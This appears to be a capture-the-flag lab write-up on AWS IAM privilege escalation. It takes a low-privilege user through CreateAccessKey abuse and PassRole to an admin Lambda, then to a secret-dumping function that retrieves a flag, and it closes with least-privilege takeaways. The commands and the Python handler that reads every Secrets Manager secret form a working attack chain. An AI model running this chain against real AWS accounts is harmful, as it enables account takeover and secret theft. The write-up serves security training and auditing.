# Challenge Writeup: Mapper (Medium) — HackSmarter Lab

## Overview

| Field      | Details                        |
|------------|--------------------------------|
| Challenge  | Mapper                         |
| Difficulty | Medium                         |
| Category   | AWS IAM Privilege Escalation   |
| Target     | AWS Secrets Manager (flag)     |

## Objective

Perform a full IAM audit across all users in an AWS account, identify a privilege escalation path, and retrieve a flag stored in Secrets Manager that is only accessible to Administrators.

## Initial Access

The lab provides a low-privilege IAM user with an access key and secret key. The hint states that the starting user has the ability to create access keys for any IAM user in the account.

```
AWS_ACCESS_KEY_ID:     AKIAUAQZZ3TY6***********
AWS_SECRET_ACCESS_KEY: 7SQo+x1ouaMn5/*********************
```

---

## Step 1 — Verify Initial Identity

Set up the credentials and confirm the starting identity.

```bash
export AWS_ACCESS_KEY_ID="AKIAUAQZZ3TY6***********"
export AWS_SECRET_ACCESS_KEY="7SQo+x1ouaMn5/*********************"
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
```

Output:

```json
{
    "UserId": "AIDAUAQZZ3TYQ7ID4XU2G",
    "Account": "276005772529",
    "Arn": "arn:aws:iam::276005772529:user/cg-pentest-lab"
}
```

The starting user is `cg-pentest-lab`.

---

## Step 2 — Enumerate Current User Permissions

Check all policies attached to the starting user.

```bash
# Managed policies attached directly
aws iam list-attached-user-policies --user-name cg-pentest-lab

# Inline policies
aws iam list-user-policies --user-name cg-pentest-lab

# Group memberships
aws iam list-groups-for-user --user-name cg-pentest-lab
```

Output:

```
Attached Policies:
  - IAMReadOnlyAccess (arn:aws:iam::aws:policy/IAMReadOnlyAccess)

Inline Policies:
  - cg-pentest-create-access-key-lab

Groups:
  (none)
```

Retrieve the inline policy document:

```bash
aws iam get-user-policy \
  --user-name cg-pentest-lab \
  --policy-name cg-pentest-create-access-key-lab
```

Output:

```json
{
    "Statement": [
        {
            "Action": "iam:CreateAccessKey",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::*:user/*"
        }
    ]
}
```

The starting user has two effective permissions:

- `IAMReadOnlyAccess` — full read access across all IAM resources (users, roles, policies, groups)
- `iam:CreateAccessKey` on `*` — can create access keys for any IAM user in the account

This is the classic shadow-admin permission: `iam:CreateAccessKey` on another user is equivalent to impersonating that user entirely.

---

## Step 3 — Enumerate All IAM Users

Use the read access to list all users in the account.

```bash
aws iam list-users --query 'Users[*].UserName' --output text
```

This returned approximately 100 users, all following the naming pattern `cg-[random]-lab`.

---

## Step 4 — Find a Privilege Escalation Target

Scan every user for attached policies that indicate elevated privileges.

```bash
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  policies=$(aws iam list-attached-user-policies \
    --user-name "$user" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)
  if echo "$policies" | grep -qi "Administrator"; then
    echo "[ADMIN] $user -> $policies"
  fi
done
```

No users had `AdministratorAccess` attached directly. Attention then shifted to inspecting inline policies on all users. One user stood out:

```
user/cg-stdqaoqb-lab — inline policy: cg-lambda-developer-policy-lab
```

Retrieve the policy document:

```bash
aws iam get-user-policy \
  --user-name cg-stdqaoqb-lab \
  --policy-name cg-lambda-developer-policy-lab
```

Output:

```json
{
    "Statement": [
        {
            "Action": [
                "lambda:CreateFunction",
                "lambda:InvokeFunction"
            ],
            "Effect": "Allow",
            "Resource": "*"
        },
        {
            "Action": "iam:PassRole",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::276005772529:role/cg-LambdaAdminExecutionRole-lab"
        }
    ]
}
```

This user can:

- Create Lambda functions (`lambda:CreateFunction`)
- Invoke Lambda functions (`lambda:InvokeFunction`)
- Assign the role `cg-LambdaAdminExecutionRole-lab` to those functions (`iam:PassRole`)

The role `cg-LambdaAdminExecutionRole-lab` has `AdministratorAccess` attached, meaning any Lambda running under it has full account access. Combined with the ability to create and invoke a function with that role, this is a complete privilege escalation path without ever touching IAM escalation directly.

---

## Step 5 — Create Access Key for the Target User

Use the starting user's `iam:CreateAccessKey` permission to create credentials for `cg-stdqaoqb-lab`.

```bash
aws iam create-access-key --user-name cg-stdqaoqb-lab
```

Output:

```json
{
    "AccessKey": {
        "UserName": "cg-stdqaoqb-lab",
        "AccessKeyId": "AKIAUAQZZ3TY5***********",
        "Status": "Active",
        "SecretAccessKey": "BOCYEWS0oYZ7fg*********************"
    }
}
```

---

## Step 6 — Switch to the Escalated User

```bash
export AWS_ACCESS_KEY_ID="AKIAUAQZZ3TY5***********"
export AWS_SECRET_ACCESS_KEY="BOCYEWS0oYZ7fg*********************"
export AWS_DEFAULT_REGION="us-east-1"
```

---

## Step 7 — Create a Malicious Lambda Function

Write a Lambda handler that uses the admin execution role to list and read all secrets from AWS Secrets Manager.

```bash
mkdir -p /tmp/lambda_pwn

cat > /tmp/lambda_pwn/lambda_function.py << 'EOF'
import boto3

def lambda_handler(event, context):
    client = boto3.client('secretsmanager', region_name='us-east-1')
    secrets = client.list_secrets()
    results = {}
    for s in secrets['SecretList']:
        name = s['Name']
        try:
            val = client.get_secret_value(SecretId=name)
            results[name] = val.get('SecretString', 'N/A')
        except Exception as e:
            results[name] = str(e)
    return results
EOF

cd /tmp/lambda_pwn && zip function.zip lambda_function.py
```

Deploy the function, assigning the admin execution role via `PassRole`:

```bash
aws lambda create-function \
  --function-name pwn-secrets-mapper \
  --runtime python3.12 \
  --role arn:aws:iam::276005772529:role/cg-LambdaAdminExecutionRole-lab \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/lambda_pwn/function.zip \
  --timeout 30
```

---

## Step 8 — Invoke the Function and Retrieve the Flag

```bash
aws lambda invoke \
  --function-name pwn-secrets-mapper \
  --payload '{}' \
  /tmp/output.json

cat /tmp/output.json
```

Output:

```json
{"cg-admin-flag-lab": "HSM{44c9f2969e2b49e19c9575ec0816****}"}
```

---

## Flag

```
HSM{44c9f2969e2b49e19c9575ec0816****}
```

---

## Full Exploit Chain

```
cg-pentest-lab
  |
  |-- IAMReadOnlyAccess
  |     Enumerate all users, roles, and policies across the account
  |
  |-- iam:CreateAccessKey on *
  |     Create credentials for any IAM user without knowing their password
  |
  v
cg-stdqaoqb-lab (target user)
  |
  |-- lambda:CreateFunction + lambda:InvokeFunction
  |-- iam:PassRole -> cg-LambdaAdminExecutionRole-lab (AdministratorAccess)
  |
  v
Lambda function running as administrator
  |
  |-- secretsmanager:ListSecrets
  |-- secretsmanager:GetSecretValue
  |
  v
HSM{44c9f2969e2b49e19c9575ec0816****}
```

---

## Key Takeaways

**iam:CreateAccessKey on \* is a shadow-admin permission.** Any user or role with this permission can impersonate every other user in the account, including those with full administrator access. It should be scoped to specific user ARNs at minimum, or removed entirely if not operationally required.

**iam:PassRole combined with lambda:CreateFunction is equivalent to privilege escalation.** If a user can pass a high-privilege role to a Lambda function they create, they effectively inherit all permissions of that role without any IAM assignment being made to their own identity. This bypasses traditional escalation detection.

**Least privilege was not enforced.** The lab demonstrated that the combination of broad read access (`IAMReadOnlyAccess`) and targeted dangerous permissions (`iam:CreateAccessKey`, `iam:PassRole`) across different users creates a multi-hop escalation path that no single policy check would catch in isolation. A proper IAM audit using a graph-based tool such as Principal Mapper or Cloudsplaining would surface these paths automatically.
